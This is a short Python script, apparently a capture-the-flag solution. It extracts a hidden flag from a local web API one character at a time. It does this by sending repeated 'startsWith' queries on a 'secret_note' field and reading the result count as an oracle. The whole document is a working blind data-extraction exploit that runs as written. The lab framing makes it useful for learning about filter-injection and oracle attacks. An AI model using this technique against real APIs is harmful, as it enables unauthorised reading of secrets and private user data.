import requests
import string
import time

BASE_URL = "http://localhost:8080/api/users"
CHARSET = string.ascii_letters + string.digits + "{}_-"
flag = "WSL{"

session = requests.Session()

while not flag.endswith("}"):
    found = False

    for ch in CHARSET:
        candidate = flag + ch
        params = {
            "field": "secret_note",
            "op": "startsWith",
            "value": candidate
        }

        try:
            r = session.get(BASE_URL, params=params, timeout=15)
            r.raise_for_status()
            data = r.json()
        except requests.exceptions.RequestException as e:
            print(f"[!] request failed for {candidate}: {e}")
            time.sleep(1)
            continue

        if data.get("total", 0) > 0:
            flag = candidate
            print("[+] flag so far:", flag)
            found = True
            break

    if not found:
        print("[-] next character not found")
        break

print("[*] final:", flag)